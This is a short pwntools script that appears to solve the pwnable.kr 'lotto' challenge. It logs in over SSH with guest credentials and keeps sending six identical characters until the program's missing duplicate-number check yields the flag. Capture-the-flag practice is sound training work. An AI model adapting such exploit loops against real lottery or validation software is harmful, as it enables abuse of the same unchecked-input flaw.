from pwn import *

con = ssh("lotto", "pwnable.kr", 2222, "guest")
sh = con.process(executable="/home/lotto/lotto")
while True:
    sh.recvuntil("3. Exit")
    sh.sendline("1")
    sh.sendline("#" * 6)
    flag = sh.recvlines(3)[2]
    print flag
    if flag != "bad luck...":
        break

# sorry mom... I FORGOT to check duplicate numbers... :(
